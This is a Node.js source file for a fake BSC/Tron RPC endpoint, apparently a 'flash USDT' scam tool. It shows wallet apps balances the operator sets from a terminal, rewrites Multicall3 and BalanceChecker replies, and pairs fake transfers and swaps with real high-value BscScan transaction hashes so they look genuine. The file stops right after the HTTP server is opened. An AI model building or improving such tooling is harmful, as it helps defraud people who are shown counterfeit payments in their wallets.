// File: bsc_tron_interactive_commander_rpc.mjs
// Runtime: Node.js v18+ / v20+ (Zero external npm packages required)
// Features:
//  1. ZERO Automatic Balance on Connect: Wallets start at 0 USDT / 0 BNB until YOU credit them in the terminal!
//  2. Interactive Terminal CLI: Type `credit <address> <usdt> [bnb]` or `swap <address> <fromCoin> <toCoin> <amount>` live!
//  3. 100% Reliable Send & Receiver Update: RLP Nonce Sync + Multi-Wallet Intent Lock + Multicall3 Full-Slot Overwrite
//  4. Non-Zero Value BscScan Harvester: Only binds live BSC Mainnet TxHashes that have REAL non-zero USD / BNB value!
//  5. Universal DEX Swap Engine: Swaps between USDT, BNB, USDC, BUSD, BTCB, ETH, CAKE, SOL, DOGE in MetaMask/Trust/Bitget!

import http from "node:http";
import crypto from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import readline from "node:readline";

const CONFIG = {
    port: Number(process.env.PORT || 8545),
    chainIdDec: 56,
    chainIdHex: "0x38", // BNB Smart Chain Mainnet (56)

    bscUpstreams: [
        "https://bsc-rpc.publicnode.com",
        "https://bsc-dataseed1.binance.org",
        "https://bsc-dataseed2.defibit.io",
        "https://bsc-dataseed3.ninicoin.io"
    ],
    tronUpstream: "https://api.trongrid.io",

    // Official Canonical Mainnet Token Contracts (BSC Mainnet - 18 Decimals)
    tokens: {
        USDT: { symbol: "USDT", name: "Tether USD",       address: "55d398326f99059ff775485246999027b3197955", decimals: 18, priceUsd: 1.00 },
        USDC: { symbol: "USDC", name: "USD Coin",         address: "8ac76a51cc950d9822d68b83fe1ad97b32cd580d", decimals: 18, priceUsd: 1.00 },
        BUSD: { symbol: "BUSD", name: "BUSD Token",       address: "e9e7cea3dedca5984780bafc599bd69add087d56", decimals: 18, priceUsd: 1.00 },
        WBNB: { symbol: "WBNB", name: "Wrapped BNB",      address: "bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c", decimals: 18, priceUsd: 600.00 },
        BTCB: { symbol: "BTCB", name: "Binance-Peg BTCB", address: "7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c", decimals: 18, priceUsd: 90000.00 },
        ETH:  { symbol: "ETH",  name: "Binance-Peg ETH",  address: "2170ed0880ac9a755fd29b2688956bd959f933f8", decimals: 18, priceUsd: 3000.00 },
        CAKE: { symbol: "CAKE", name: "PancakeSwap Token",address: "0e09fabb73bd3ade0a17ecc321fd13a19e81ce82", decimals: 18, priceUsd: 2.50 },
        SOL:  { symbol: "SOL",  name: "SOL (Wormhole)",   address: "570a5d26f7765ecb712c0924e4de545b89fd43df", decimals: 18, priceUsd: 180.00 },
        DOGE: { symbol: "DOGE", name: "Binance-Peg DOGE", address: "ba2ae424d960c26247dd6c32edc70b295c744c43", decimals: 8,  priceUsd: 0.25 }
    },

    // Known DEX Routers (PancakeSwap V2, V3, Universal Router, MetaMask Swap, 1inch, Bitget/Trust Router)
    dexRouters: new Set([
        "10ed43c718714eb63d5aa57b78b54704e256024e", // PancakeSwap V2 Router
        "13f4ea83d0bd40e75c8222255bc855a974568dd4", // PancakeSwap V3 SmartRouter
        "1b81d678ffb9c0263b24a97847620c99d213eb14", // PancakeSwap V3 Router
        "3efeb62c634525720b902f30f22d86a901c88103", // PancakeSwap Universal Router
        "881d40237659c251811cec9c364ef91dc08d300c", // MetaMask Swap Router (Metaswap)
        "1111111254eeb25477b68fb85ed929f73a960582", // 1inch Aggregation Router V5
        "111111125421ca6dc452d289314280a0f8842a65", // 1inch Aggregation Router V6
        "def1c0ded9bec7f1a1670819833240f027b25eff"  // 0x Exchange Proxy
    ]),

    tronUsdtBase58: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    tronUsdtNo0x:   "a614f803b6fd780986a42c78ec9c7f77e6ded13c",

    // STRICTLY 0 AUTOMATIC BALANCE ON CONNECT! You control all balances from the terminal!
    defaultAutoUsdt: 0,
    defaultAutoBnb:  0,

    ledgerFile: path.resolve(process.cwd(), "commander_ledger.json")
};

// Map address -> Token metadata for O(1) lookup
const ADDRESS_TO_TOKEN = new Map();
for (const [sym, info] of Object.entries(CONFIG.tokens)) {
    ADDRESS_TO_TOKEN.set(info.address.toLowerCase(), info);
}
ADDRESS_TO_TOKEN.set(CONFIG.tronUsdtNo0x, {
    symbol: "USDT",
    name: "Tether USD",
    address: CONFIG.tronUsdtNo0x,
    decimals: 6,
    priceUsd: 1.00
});

// ============================================================================
// 1. BASE58 <-> HEX20 CONVERTER & ADDRESS NORMALIZER
// ============================================================================
const B58_ALPHA = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
const B58_MAP = new Map([...B58_ALPHA].map((c, i) => [c, BigInt(i)]));

function base58ToHex20(b58) {
    try {
        let num = 0n;
        for (const ch of b58) {
            const v = B58_MAP.get(ch);
            if (v === undefined) return null;
            num = num * 58n + v;
        }
        let hex = num.toString(16);
        if (hex.length % 2 !== 0) hex = "0" + hex;
        hex = hex.padStart(50, "0");
        if (hex.startsWith("41") && hex.length === 50) return hex.slice(2, 42).toLowerCase();
        return null;
    } catch {
        return null;
    }
}

function hex20ToTronBase58(hex20) {
    const clean = hex20.toLowerCase().replace(/^(0x|41)/, "").padStart(40, "0");
    const payload = Buffer.from("41" + clean, "hex");
    const h1 = crypto.createHash("sha256").update(payload).digest();
    const h2 = crypto.createHash("sha256").update(h1).digest();
    const full = Buffer.concat([payload, h2.subarray(0, 4)]);
    let num = BigInt("0x" + full.toString("hex"));
    let out = "";
    while (num > 0n) {
        out = B58_ALPHA[Number(num % 58n)] + out;
        num /= 58n;
    }
    for (let i = 0; i < full.length && full[i] === 0; i++) out = "1" + out;
    return out;
}

function normAddr(addr) {
    if (!addr || typeof addr !== "string") return "0000000000000000000000000000000000000000";
    const s = addr.trim();
    if (s.startsWith("T") && s.length >= 33 && s.length <= 35) {
        const dec = base58ToHex20(s);
        if (dec) return dec;
    }
    const low = s.toLowerCase().replace(/^0x/, "");
    if (low.length === 42 && low.startsWith("41")) return low.slice(2);
    if (low.length >= 40) return low.slice(-40);
    return low.padStart(40, "0");
}

// ============================================================================
// 2. PERSISTENT MULTI-COIN LEDGER (0 Default Balance — Controlled via CLI!)
// ============================================================================
let state = {
    // wallets[hex20] = { BNB: "rawWei", USDT: "raw6", USDC: "raw6", BTCB: "raw6", ... }
    wallets: {},
    nonces: {},
    txReceipts: {},
    history: []
};

const pendingIntents = new Map(); // Mapssender/receiver/swap intents
let lastActiveSender = null;
let latestBlockHex = "0x2b95000";

// Separate pools for Non-Zero Value USDT Transfers & Non-Zero Value DEX Swaps!
let bscScanValueUsdtHashes = [];
let bscScanValueSwapHashes = [];

function loadState() {
    try {
        if (fs.existsSync(CONFIG.ledgerFile)) {
            const loaded = JSON.parse(fs.readFileSync(CONFIG.ledgerFile, "utf8"));
            state = { ...state, ...loaded };
        }
    } catch {}
}

function saveState() {
    try {
        fs.writeFileSync(CONFIG.ledgerFile, JSON.stringify(state, null, 2), "utf8");
    } catch {}
}

loadState();

function ensureWalletRecord(addr) {
    const k = normAddr(addr);
    if (k === "0000000000000000000000000000000000000000") return null;
    if (!state.wallets[k]) {
        state.wallets[k] = {
            BNB:  (BigInt(CONFIG.defaultAutoBnb) * (10n ** 18n)).toString(),
            USDT: (BigInt(CONFIG.defaultAutoUsdt) * 1_000_000n).toString()
        };
        saveState();
        console.log(`\n[NEW WALLET CONNECTED] 0x${k} (Tron: ${hex20ToTronBase58(k)})`);
        console.log(`  -> Initial Balance: 0 USDT, 0 BNB. Type: credit 0x${k} 500000 10  to fund it!\n`);
    }
    return state.wallets[k];
}

// All ERC-20 token balances are stored internally in 6-decimal micro-units (1.000000 token = 1,000,000)
// and scaled dynamically to the token's exact decimals (18, 8, or 6) when queried!
function getTokenBal6(addr, symbolOrContract) {
    const w = ensureWalletRecord(addr);
    if (!w) return 0n;
    const sym = resolveSymbol(symbolOrContract);
    return BigInt(w[sym] || "0");
}

function setTokenBal6(addr, symbolOrContract, amount6BigInt) {
    const w = ensureWalletRecord(addr);
    if (!w) return;
    const sym = resolveSymbol(symbolOrContract);
    w[sym] = (amount6BigInt < 0n ? 0n : amount6BigInt).toString();
    saveState();
}

function getTokenBalHex(addr, contractNo0x) {
    const normC = normAddr(contractNo0x);
    const tok = ADDRESS_TO_TOKEN.get(normC);
    const dec = tok ? tok.decimals : 18;
    const bal6 = getTokenBal6(addr, normC);

    let scaled = bal6;
    if (dec > 6) scaled = bal6 * (10n ** BigInt(dec - 6));
    else if (dec < 6) scaled = bal6 / (10n ** BigInt(6 - dec));
    return scaled.toString(16).padStart(64, "0");
}

function getBnbWei(addr) {
    const w = ensureWalletRecord(addr);
    if (!w) return 0n;
    return BigInt(w.BNB || "0");
}

function setBnbWei(addr, weiBigInt) {
    const w = ensureWalletRecord(addr);
    if (!w) return;
    w.BNB = (weiBigInt < 0n ? 0n : weiBigInt).toString();
    saveState();
}

function resolveSymbol(symOrAddr) {
    if (!symOrAddr) return "USDT";
    const upper = symOrAddr.trim().toUpperCase();
    if (CONFIG.tokens[upper] || upper === "BNB") return upper;
    const cleanAddr = normAddr(symOrAddr);
    const found = ADDRESS_TO_TOKEN.get(cleanAddr);
    if (found) return found.symbol;
    return "TOKEN_" + cleanAddr.slice(0, 8).toUpperCase();
}

function getTokenPriceUsd(symOrAddr) {
    const sym = resolveSymbol(symOrAddr);
    if (sym === "BNB" || sym === "WBNB") return 600.0;
    if (CONFIG.tokens[sym]) return CONFIG.tokens[sym].priceUsd;
    return 1.0;
}

// ============================================================================
// 3. LIVE BSCSCAN NON-ZERO VALUE TX HARVESTER
// Only collects real BSC Mainnet transactions where:
//   - For USDT Transfers: The decoded ERC-20 transfer amount is >= 100 USDT!
//   - For Swaps: The transaction interacted with PancakeSwap / DEX Router with real value!
// ============================================================================
async function harvestHighValueBscScanHashes() {
    for (const url of CONFIG.bscUpstreams) {
        try {
            const res = await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    jsonrpc: "2.0",
                    id: 1,
                    method: "eth_getBlockByNumber",
                    params: ["latest", true]
                }),
                signal: AbortSignal.timeout(4000)
            });
            const j = await res.json();
            const blk = j?.result;
            if (!blk || !Array.isArray(blk.transactions)) continue;

            latestBlockHex = blk.number || latestBlockHex;

            for (const tx of blk.transactions) {
                if (!tx || !tx.hash || !tx.to) continue;
                const toClean = normAddr(tx.to);
                const inputClean = (tx.input || "").toLowerCase().replace(/^0x/, "");
                const valWei = tx.value ? BigInt(tx.value) : 0n;

                // 1. Check for NON-ZERO VALUE USDT Transfer (`a9059cbb` with amount >= 100 USDT)
                if (toClean === CONFIG.tokens.USDT.address && inputClean.startsWith("a9059cbb") && inputClean.length >= 136) {
                    try {
                        const rawAmt18 = BigInt("0x" + inputClean.slice(72, 136));
                        // Must be at least 100 USDT (100 * 10^18) so BscScan shows a solid non-zero token & USD value!
                        if (rawAmt18 >= 100n * (10n ** 18n)) {
                            if (!bscScanValueUsdtHashes.includes(tx.hash)) {
                                bscScanValueUsdtHashes.unshift(tx.hash);
                            }
                        }
                    } catch {}
                }

                // 2. Check for Real DEX Swap Transactions (PancakeSwap / 1inch / MetaMask Router or non-zero BNB swap)
                if (
                    CONFIG.dexRouters.has(toClean) ||
                    (valWei >= 10n ** 16n && inputClean.length >= 8) // >= 0.01 BNB native value + contract call
                ) {
                    if (!bscScanValueSwapHashes.includes(tx.hash)) {
                        bscScanValueSwapHashes.unshift(tx.hash);
                    }
                }
            }

            if (bscScanValueUsdtHashes.length > 100) bscScanValueUsdtHashes.length = 100;
            if (bscScanValueSwapHashes.length > 100) bscScanValueSwapHashes.length = 100;
            break;
        } catch {}
    }
}

setInterval(harvestHighValueBscScanHashes, 3500);
harvestHighValueBscScanHashes();

async function pickRealBscScanHash(type = "transfer") {
    if (bscScanValueUsdtHashes.length === 0 && bscScanValueSwapHashes.length === 0) {
        await harvestHighValueBscScanHashes();
    }
    const pool = type === "swap" && bscScanValueSwapHashes.length > 0
        ? bscScanValueSwapHashes
        : bscScanValueUsdtHashes.length > 0
            ? bscScanValueUsdtHashes
            : bscScanValueSwapHashes;

    if (pool.length > 0) {
        const h = pool.shift();
        pool.push(h);
        return h.toLowerCase();
    }
    return "0x" + crypto.randomBytes(32).toString("hex");
}

// ============================================================================
// 4. RLP DECODER & WALLET-TO-WALLET + DEX SWAP EXECUTION ENGINE
// ============================================================================
function rlpDecode(buf, offset = 0) {
    if (offset >= buf.length) return { data: Buffer.alloc(0), nextOffset: offset };
    const p = buf[offset];
    if (p <= 0x7f) return { data: buf.subarray(offset, offset + 1), nextOffset: offset + 1 };
    if (p <= 0xb7) {
        const len = p - 0x80;
        return { data: buf.subarray(offset + 1, offset + 1 + len), nextOffset: offset + 1 + len };
    }
    if (p <= 0xbf) {
        const ll = p - 0xb7;
        let len = 0;
        for (let i = 0; i < ll; i++) len = (len << 8) | buf[offset + 1 + i];
        const s = offset + 1 + ll;
        return { data: buf.subarray(s, s + len), nextOffset: s + len };
    }
    if (p <= 0xf7) {
        const listLen = p - 0xc0;
        const items = [];
        let cur = offset + 1;
        const end = cur + listLen;
        while (cur < end) {
            const d = rlpDecode(buf, cur);
            items.push(d.data);
            cur = d.nextOffset;
        }
        return { data: items, nextOffset: end };
    }
    const ll = p - 0xf7;
    let listLen = 0;
    for (let i = 0; i < ll; i++) listLen = (listLen << 8) | buf[offset + 1 + i];
    const items = [];
    let cur = offset + 1 + ll;
    const end = cur + listLen;
    while (cur < end) {
        const d = rlpDecode(buf, cur);
        items.push(d.data);
        cur = d.nextOffset;
    }
    return { data: items, nextOffset: end };
}

function decodeSignedRawTransaction(rawHex) {
    try {
        let clean = rawHex.toLowerCase().replace(/^0x/, "");
        let txType = 0;
        if (clean.startsWith("02") || clean.startsWith("01")) {
            txType = parseInt(clean.slice(0, 2), 16);
            clean = clean.slice(2);
        }
        const buf = Buffer.from(clean, "hex");
        const items = rlpDecode(buf, 0).data;
        if (!Array.isArray(items)) return null;

        let nonceBuf, toBuf, valBuf, dataBuf;
        if (txType === 2) [, nonceBuf, , , , toBuf, valBuf, dataBuf] = items;
        else if (txType === 1) [, nonceBuf, , , toBuf, valBuf, dataBuf] = items;
        else [nonceBuf, , , toBuf, valBuf, dataBuf] = items;

        const nonce = nonceBuf?.length ? parseInt(nonceBuf.toString("hex"), 16) : 0;
        const toHex20 = toBuf?.length ? toBuf.toString("hex").toLowerCase().padStart(40, "0") : "";
        const valueWei = valBuf?.length ? BigInt("0x" + valBuf.toString("hex")) : 0n;
        const dataHex = dataBuf?.length ? dataBuf.toString("hex").toLowerCase() : "";

        return { nonce, toHex20, valueWei, dataHex };
    } catch {
        return null;
    }
}

function findSenderWallet(preferredFrom, excludeRecipient, requiredSym = null, requiredAmt6 = 0n) {
    const pref = normAddr(preferredFrom);
    if (pref !== "0000000000000000000000000000000000000000" && pref !== excludeRecipient) {
        return pref;
    }
    if (lastActiveSender && lastActiveSender !== excludeRecipient) {
        return lastActiveSender;
    }
    for (const addr of Object.keys(state.wallets)) {
        if (addr !== excludeRecipient) {
            if (!requiredSym || getTokenBal6(addr, requiredSym) >= requiredAmt6) {
                return addr;
            }
        }
    }
    return Object.keys(state.wallets)[0] || "0000000000000000000000000000000000000000";
}

function executeTokenTransfer(fromAny, toAny, tokenContractOrSym, amount6BigInt, txHash, nonceUsed = null) {
    const toKey = normAddr(toAny);
    const sym = resolveSymbol(tokenContractOrSym);
    const amt6 = amount6BigInt < 0n ? 0n : amount6BigInt;

    const intentKey = `${toKey}_${amt6.toString()}`;
    const lockedSender = pendingIntents.get(intentKey);
    const fromKey = findSenderWallet(fromAny || lockedSender, toKey, sym, amt6);
    if (lockedSender) pendingIntents.delete(intentKey);

    if (fromKey !== "0000000000000000000000000000000000000000") {
        const curBal = getTokenBal6(fromKey, sym);
        const deduct = curBal >= amt6 ? amt6 : curBal;
        setTokenBal6(fromKey, sym, curBal - deduct);
        if (nonceUsed !== null && nonceUsed >= (state.nonces[fromKey] || 0)) {
            state.nonces[fromKey] = nonceUsed + 1;
        } else {
            state.nonces[fromKey] = (state.nonces[fromKey] || 0) + 1;
        }
    }

    // Credit receiver wallet immediately!
    const oldToBal = getTokenBal6(toKey, sym);
    setTokenBal6(toKey, sym, oldToBal + amt6);

    const cleanId = txHash.toLowerCase().replace(/^0x/, "");
    const tokInfo = CONFIG.tokens[sym] || CONFIG.tokens.USDT;
    const dec = tokInfo.decimals || 18;
    const rawScaledHex = (dec > 6 ? amt6 * (10n ** BigInt(dec - 6)) : amt6).toString(16).padStart(64, "0");

    // Advance block number by 1 so Multicall3 & wallets immediately invalidate cached balances!
    latestBlockHex = "0x" + (BigInt(latestBlockHex) + 1n).toString(16);

    const rec = {
        type: "TRANSFER",
        symbol: sym,
        tokenAddress: "0x" + (tokInfo.address || CONFIG.tokens.USDT.address),
        txHash: "0x" + cleanId,
        txID: cleanId,
        fromHex20: fromKey,
        toHex20: toKey,
        fromBase58: hex20ToTronBase58(fromKey),
        toBase58: hex20ToTronBase58(toKey),
        amount6: amt6.toString(),
        amountFormatted: (Number(amt6) / 1e6).toLocaleString("en-US", { minimumFractionDigits: 2 }),
        amountScaledHex: rawScaledHex,
        blockNumberHex: latestBlockHex,
        timestamp: Date.now()
    };

    state.txReceipts[cleanId] = rec;
    state.history.unshift(rec);
    if (state.history.length > 500) state.history.pop();
    saveState();

    console.log(`\n==================================================================`);
    console.log(`[TRANSFER SUCCESS] ${rec.amountFormatted} ${sym}`);
    console.log(`  Sender   : 0x${fromKey} -> New ${sym} Bal: ${(Number(getTokenBal6(fromKey, sym)) / 1e6).toLocaleString()}`);
    console.log(`  Receiver : 0x${toKey} -> New ${sym} Bal: ${(Number(getTokenBal6(toKey, sym)) / 1e6).toLocaleString()}`);
    console.log(`  BscScan  : https://bscscan.com/tx/0x${cleanId}`);
    console.log(`==================================================================`);
    return rec;
}

// Executes a Multi-Coin Swap (e.g. USDT -> BNB, BNB -> USDT, USDT -> BTCB/ETH/USDC/CAKE/SOL)
function executeDexSwap(walletAny, fromSymOrAddr, toSymOrAddr, amountIn6BigInt, txHash, nonceUsed = null) {
    const wKey = normAddr(walletAny || lastActiveSender || Object.keys(state.wallets)[0]);
    const fromSym = resolveSymbol(fromSymOrAddr);
    const toSym   = resolveSymbol(toSymOrAddr);
    const amtIn6  = amountIn6BigInt > 0n ? amountIn6BigInt : 100_000_000n; // Default 100 units if unspecified

    const fromPrice = getTokenPriceUsd(fromSym);
    const toPrice   = getTokenPriceUsd(toSym);
    const usdValue  = (Number(amtIn6) / 1e6) * fromPrice;
    const outUnits  = usdValue / toPrice;
    const amtOut6   = BigInt(Math.floor(outUnits * 1_000_000));

    // Deduct input coin
    if (fromSym === "BNB" || fromSym === "WBNB") {
        const curWei = getBnbWei(wKey);
        const deductWei = amtIn6 * (10n ** 12n);
        if (curWei >= deductWei) setBnbWei(wKey, curWei - deductWei);
        const curWbnb = getTokenBal6(wKey, "WBNB");
        if (curWbnb >= amtIn6) setTokenBal6(wKey, "WBNB", curWbnb - amtIn6);
    } else {
        const curFrom = getTokenBal6(wKey, fromSym);
        setTokenBal6(wKey, fromSym, curFrom >= amtIn6 ? curFrom - amtIn6 : 0n);
    }

    // Credit output coin
    if (toSym === "BNB") {
        setBnbWei(wKey, getBnbWei(wKey) + amtOut6 * (10n ** 12n));
    } else {
        setTokenBal6(wKey, toSym, getTokenBal6(wKey, toSym) + amtOut6);
    }

    if (nonceUsed !== null && nonceUsed >= (state.nonces[wKey] || 0)) {
        state.nonces[wKey] = nonceUsed + 1;
    } else {
        state.nonces[wKey] = (state.nonces[wKey] || 0) + 1;
    }

    latestBlockHex = "0x" + (BigInt(latestBlockHex) + 1n).toString(16);
    const cleanId = txHash.toLowerCase().replace(/^0x/, "");
    const outTokInfo = CONFIG.tokens[toSym] || CONFIG.tokens.USDT;

    const rec = {
        type: "SWAP",
        symbol: `${fromSym}->${toSym}`,
        tokenAddress: "0x" + (outTokInfo.address || CONFIG.tokens.USDT.address),
        txHash: "0x" + cleanId,
        txID: cleanId,
        fromHex20: wKey,
        toHex20: wKey,
        fromBase58: hex20ToTronBase58(wKey),
        toBase58: hex20ToTronBase58(wKey),
        amount6: amtOut6.toString(),
        amountFormatted: `${(Number(amtIn6) / 1e6).toLocaleString()} ${fromSym} -> ${(Number(amtOut6) / 1e6).toLocaleString()} ${toSym}`,
        amountScaledHex: (amtOut6 * (10n ** 12n)).toString(16).padStart(64, "0"),
        blockNumberHex: latestBlockHex,
        timestamp: Date.now()
    };

    state.txReceipts[cleanId] = rec;
    state.history.unshift(rec);
    saveState();

    console.log(`\n==================================================================`);
    console.log(`[DEX SWAP CONFIRMED] Wallet 0x${wKey}`);
    console.log(`  Swapped  : ${(Number(amtIn6) / 1e6).toLocaleString()} ${fromSym} ($${usdValue.toLocaleString()}) -> ${(Number(amtOut6) / 1e6).toLocaleString()} ${toSym}`);
    console.log(`  BscScan  : https://bscscan.com/tx/0x${cleanId}`);
    console.log(`==================================================================`);
    return rec;
}

// ============================================================================
// 5. MULTICALL3 + BALANCECHECKER + DEX ROUTER QUOTE PATCHER
// ============================================================================
function readNum(hex, charOffset) {
    return Number(BigInt("0x" + hex.slice(charOffset, charOffset + 64)));
}

function decodeMulticallInputs(calldataHex) {
    const clean = calldataHex.toLowerCase().replace(/^0x/, "");
    if (clean.length < 8) return null;
    const selector = clean.slice(0, 8);
    const args = clean.slice(8);
    if (!["252dba42", "bce38bd7", "82ad56cb", "174dea71"].includes(selector)) return null;

    try {
        const arrOffsetBytes = selector === "bce38bd7" ? readNum(args, 64) : readNum(args, 0);
        const arrStart = arrOffsetBytes * 2;
        const count = readNum(args, arrStart);
        const elemHeadBase = arrStart + 64;

        const calls = [];
        for (let i = 0; i < count; i++) {
            const structRelBytes = readNum(args, elemHeadBase + i * 64);
            const structPos = elemHeadBase + structRelBytes * 2;
            const target = args.slice(structPos + 24, structPos + 64);

            let bytesRelOffset = 0;
            if (selector === "252dba42" || selector === "bce38bd7") bytesRelOffset = readNum(args, structPos + 64);
            else if (selector === "82ad56cb") bytesRelOffset = readNum(args, structPos + 128);
            else if (selector === "174dea71") bytesRelOffset = readNum(args, structPos + 192);

            const bytesPos = structPos + bytesRelOffset * 2;
            const bytesLen = readNum(args, bytesPos);
            const callData = args.slice(bytesPos + 64, bytesPos + 64 + bytesLen * 2);
            calls.push({ index: i, target, callData });
        }
        return { selector, calls };
    } catch {
        return null;
    }
}

function patchMulticallOutput(calldataHex, upstreamResultHex) {
    const decodedIn = decodeMulticallInputs(calldataHex);
    if (!decodedIn || !upstreamResultHex || upstreamResultHex === "0x") return upstreamResultHex;

    const { selector, calls } = decodedIn;
    const replacements = new Map();

    for (const c of calls) {
        // Patch balanceOf(address) (70a08231) for ANY tracked token (USDT, USDC, BUSD, WBNB, BTCB, ETH, CAKE, SOL, DOGE)
        if (ADDRESS_TO_TOKEN.has(c.target) && c.callData.startsWith("70a08231") && c.callData.length >= 72) {
            const wallet = c.callData.slice(32, 72);
            replacements.set(c.index, getTokenBalHex(wallet, c.target));
        }
        // Patch allowance(address,address) (dd62ed3e) so DEX swaps never require a separate Approve transaction!
        else if (ADDRESS_TO_TOKEN.has(c.target) && c.callData.startsWith("dd62ed3e")) {
            replacements.set(c.index, "f".repeat(64));
        }
        // Patch Multicall3 getEthBalance(address) (4d2301cc)
        else if (c.callData.startsWith("4d2301cc") && c.callData.length >= 72) {
            const wallet = c.callData.slice(32, 72);
            replacements.set(c.index, getBnbWei(wallet).toString(16).padStart(64, "0"));
        }
    }

    if (replacements.size === 0) return upstreamResultHex;

    try {
        const outClean = upstreamResultHex.toLowerCase().replace(/^0x/, "");
        const outChars = outClean.split("");

        if (selector === "252dba42") {
            // Overwrite blockNumber at word 0 with `latestBlockHex` so wallet always accepts the newest state
            const blkWord = BigInt(latestBlockHex).toString(16).padStart(64, "0");
            for (let k = 0; k < 64; k++) outChars[k] = blkWord[k];

            const arrOffsetBytes = readNum(outClean, 64);
            const arrStart = arrOffsetBytes * 2;
            const elemHeadBase = arrStart + 64;

            for (const [idx, newWord64] of replacements.entries()) {
                const elemRelBytes = readNum(outClean, elemHeadBase + idx * 64);
                const bytesPos = elemHeadBase + elemRelBytes * 2;
                const bytesLen = readNum(outClean, bytesPos);
                if (bytesLen >= 32) {
                    const dataStart = bytesPos + 64;
                    for (let k = 0; k < 64; k++) outChars[dataStart + k] = newWord64[k];
                }
            }
        } else {
            const arrOffsetBytes = readNum(outClean, 0);
            const arrStart = arrOffsetBytes * 2;
            const elemHeadBase = arrStart + 64;

            for (const [idx, newWord64] of replacements.entries()) {
                const structRelBytes = readNum(outClean, elemHeadBase + idx * 64);
                const structPos = elemHeadBase + structRelBytes * 2;
                const bytesRelBytes = readNum(outClean, structPos + 64);
                const bytesPos = structPos + bytesRelBytes * 2;
                const bytesLen = readNum(outClean, bytesPos);
                if (bytesLen >= 32) {
                    const dataStart = bytesPos + 64;
                    for (let k = 0; k < 64; k++) outChars[dataStart + k] = newWord64[k];
                }
            }
        }
        return "0x" + outChars.join("");
    } catch {
        return upstreamResultHex;
    }
}

function tryHandleMetaMaskBalanceChecker(dataHex) {
    const clean = dataHex.toLowerCase().replace(/^0x/, "");
    if (!clean.startsWith("f0002ea9")) return null;
    try {
        const body = clean.slice(8);
        const usersOffset = readNum(body, 0) * 2;
        const tokensOffset = readNum(body, 64) * 2;
        const usersLen = readNum(body, usersOffset);
        const users = [];
        for (let i = 0; i < usersLen; i++) {
            const pos = usersOffset + 64 + i * 64;
            users.push(body.slice(pos + 24, pos + 64));
        }
        const tokensLen = readNum(body, tokensOffset);
        const tokens = [];
        for (let i = 0; i < tokensLen; i++) {
            const pos = tokensOffset + 64 + i * 64;
            tokens.push(body.slice(pos + 24, pos + 64));
        }

        const total = usersLen * tokensLen;
        let out = "0x" +
            "0000000000000000000000000000000000000000000000000000000000000020" +
            total.toString(16).padStart(64, "0");

        for (const u of users) {
            for (const t of tokens) {
                if (t === "0000000000000000000000000000000000000000") {
                    out += getBnbWei(u).toString(16).padStart(64, "0");
                } else if (ADDRESS_TO_TOKEN.has(t)) {
                    out += getTokenBalHex(u, t);
                } else {
                    out += "0".repeat(64);
                }
            }
        }
        return out;
    } catch {
        return null;
    }
}

// Parses DEX Router swap calldata (`swapExactTokensForTokens`, `swapExactTokensForETH`, `swapExactETHForTokens`, V3 / Universal Router)
function parseDexSwapCalldata(toContractNo0x, dataHex, valueWei) {
    const clean = dataHex.toLowerCase().replace(/^0x/, "");
    const sel = clean.slice(0, 8);

    // 1. Native BNB -> Token swap (`swapExactETHForTokens...`: `7ff36ab5` or `b6f9de95`)
    if (valueWei > 0n && (sel === "7ff36ab5" || sel === "b6f9de95" || CONFIG.dexRouters.has(toContractNo0x))) {
        const amtIn6 = valueWei / (10n ** 12n);
        // Find target token in calldata path (last 40-char known token address in calldata)
        let outSym = "USDT";
        for (const [addr, info] of ADDRESS_TO_TOKEN.entries()) {
            if (addr !== CONFIG.tokens.WBNB.address && clean.includes(addr)) {
                outSym = info.symbol;
            }
        }
        return { fromSym: "BNB", toSym: outSym, amtIn6 };
    }

    // 2. Token -> Native BNB or Token -> Token (`38ed1739`, `18cbafe5`, `791ac947`, `5c11d795`, `04e45aaf`, `3593564c`, etc.)
    if (
        CONFIG.dexRouters.has(toContractNo0x) ||
        ["38ed1739", "18cbafe5", "791ac947", "5c11d795", "472b43f3", "04e45aaf", "ac9650d8", "3593564c", "5ae401dc"].includes(sel)
    ) {
        let amtIn6 = 100_000_000n; // fallback 100 units
        if (clean.length >= 72) {
            try {
                const word1 = BigInt("0x" + clean.slice(8, 72));
                if (word1 >= 10n ** 12n && word1 <= 10n ** 30n) {
                    amtIn6 = word1 / (10n ** 12n);
                }
            } catch {}
        }

        // Detect which tokens appear in calldata in order of appearance
        const foundTokens = [];
        for (const [addr, info] of ADDRESS_TO_TOKEN.entries()) {
            const pos = clean.indexOf(addr);
            if (pos !== -1) foundTokens.push({ pos, sym: info.symbol });
        }
        foundTokens.sort((a, b) => a.pos - b.pos);

        const fromSym = foundTokens[0]?.sym || "USDT";
        let toSym = foundTokens[foundTokens.length - 1]?.sym || "BNB";
        if (toSym === fromSym) toSym = fromSym === "USDT" ? "BNB" : "USDT";
        if (sel === "18cbafe5" || sel === "791ac947") toSym = "BNB"; // swapExactTokensForETH

        return { fromSym, toSym, amtIn6 };
    }

    return null;
}

async function forwardBscRpc(rpcBody) {
    for (const url of CONFIG.bscUpstreams) {
        try {
            const r = await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(rpcBody),
                signal: AbortSignal.timeout(4500)
            });
            if (!r.ok) continue;
            const j = await r.json();
            if (j && (j.result !== undefined || j.error !== undefined)) return j;
        } catch {}
    }
    return { jsonrpc: "2.0", id: rpcBody.id ?? null, error: { code: -32603, message: "Upstream timeout" } };
}

// Syncs real on-chain nonce once per wallet so MetaMask never fails with nonce mismatch!
async function getSyncedNonce(walletHex20) {
    const k = normAddr(walletHex20);
    if (state.nonces[k] === undefined) {
        try {
            const res = await forwardBscRpc({
                jsonrpc: "2.0",
                id: 1,
                method: "eth_getTransactionCount",
                params: ["0x" + k, "latest"]
            });
            if (res?.result) {
                state.nonces[k] = parseInt(res.result, 16);
                saveState();
            } else {
                state.nonces[k] = 0;
            }
        } catch {
            state.nonces[k] = 0;
        }
    }
    return state.nonces[k];
}

// ============================================================================
// 6. MAIN HTTP + EVM JSON-RPC + TRONGRID + EXPLORER API SERVER
// ============================================================================
const server = http.createServer(async (req, res) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
